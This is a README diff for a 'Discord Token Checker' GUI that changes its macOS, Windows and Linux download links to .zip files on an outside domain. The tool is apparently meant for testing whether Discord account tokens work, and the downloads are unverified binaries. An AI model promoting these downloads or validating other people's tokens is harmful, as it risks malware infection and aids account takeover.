@@ -3,9 +3,9 @@ Discord Token Checker with GUI for checking discord tokens.
 ![Image of TokensChecker](https://i.imgur.com/FbBjuVu.png)
 ## Downloads
 
-[<img src="https://www.iconsdb.com/icons/preview/gray/mac-os-xxl.png" title="MacOS" height="50">](https://discordtoken.xyz/macos)&nbsp;
-[<img src="https://maxcdn.icons8.com/Share/icon/Operating_Systems//windows81600.png" title="Windows" height="50">](https://discordtoken.xyz/windows)&nbsp;
-[<img src="http://www.iconarchive.com/download/i45763/tatice/operating-systems/Linux.ico" title="Linux" height="50">](https://discordtoken.xyz/linux)&nbsp;
+[<img src="https://www.iconsdb.com/icons/preview/gray/mac-os-xxl.png" title="MacOS" height="50">](https://discordtoken.xyz/macos.zip)&nbsp;
+[<img src="https://maxcdn.icons8.com/Share/icon/Operating_Systems//windows81600.png" title="Windows" height="50">](https://discordtoken.xyz/windows.zip)&nbsp;
+[<img src="http://www.iconarchive.com/download/i45763/tatice/operating-systems/Linux.ico" title="Linux" height="50">](https://discordtoken.xyz/linux.zip)&nbsp;
 
 ## Installation
 
